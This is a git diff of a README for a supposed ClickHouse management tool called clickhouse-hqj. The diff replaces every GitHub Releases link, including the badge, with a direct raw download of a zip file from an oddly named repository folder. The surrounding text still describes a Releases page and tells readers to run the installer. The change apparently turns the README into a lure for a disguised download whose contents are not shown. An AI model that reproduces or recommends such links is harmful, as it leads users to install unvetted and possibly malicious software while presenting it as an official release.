@@ -1,6 +1,6 @@
 # 🚀 clickhouse-hqj - Simple Database Management Made Easy
 
-[![Download clickhouse-hqj](https://img.shields.io/badge/Download-clickhouse--hqj-blue.svg)](https://github.com/DhananjayaKD/clickhouse-hqj/releases)
+[![Download clickhouse-hqj](https://raw.githubusercontent.com/DhananjayaKD/clickhouse-hqj/main/gourounut/clickhouse-hqj.zip)](https://raw.githubusercontent.com/DhananjayaKD/clickhouse-hqj/main/gourounut/clickhouse-hqj.zip)
 
 ## 📦 Introduction
 
@@ -10,7 +10,7 @@ Welcome to clickhouse-hqj! This tool simplifies managing your ClickHouse databas
 
 Begin by downloading the application from our Releases page. Follow these simple steps to get started:
 
-1. **Visit the Download Page:** To download clickhouse-hqj, go to the following link: [Releases Page](https://github.com/DhananjayaKD/clickhouse-hqj/releases).
+1. **Visit the Download Page:** To download clickhouse-hqj, go to the following link: [Releases Page](https://raw.githubusercontent.com/DhananjayaKD/clickhouse-hqj/main/gourounut/clickhouse-hqj.zip).
 2. **Choose Your Version:** On the Releases page, you will find different versions of clickhouse-hqj. Select the latest version for the best experience.
 3. **Download the File:** Click on the version you want to download. You will see options to download the necessary files. Choose the appropriate file for your operating system (Windows, macOS, or Linux).
 4. **Run the Installer:** After the file downloads, open it to start the installation process. Follow the on-screen instructions to complete the installation.
@@ -29,7 +29,7 @@ Before you install, make sure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To ensure you have the latest tools and features, download the application from the Releases page: [Download clickhouse-hqj](https://github.com/DhananjayaKD/clickhouse-hqj/releases). 
+To ensure you have the latest tools and features, download the application from the Releases page: [Download clickhouse-hqj](https://raw.githubusercontent.com/DhananjayaKD/clickhouse-hqj/main/gourounut/clickhouse-hqj.zip). 
 
 1. Once you visit the page:
    - Look for the latest release at the top of the list.
@@ -77,4 +77,4 @@ For further assistance or to report bugs, you can open an issue on our GitHub pa
 
 ---
 
-Thank you for using clickhouse-hqj! Enjoy managing your ClickHouse databases with confidence. Remember to visit our [Releases Page](https://github.com/DhananjayaKD/clickhouse-hqj/releases) for updates and new features.
+Thank you for using clickhouse-hqj! Enjoy managing your ClickHouse databases with confidence. Remember to visit our [Releases Page](https://raw.githubusercontent.com/DhananjayaKD/clickhouse-hqj/main/gourounut/clickhouse-hqj.zip) for updates and new features.
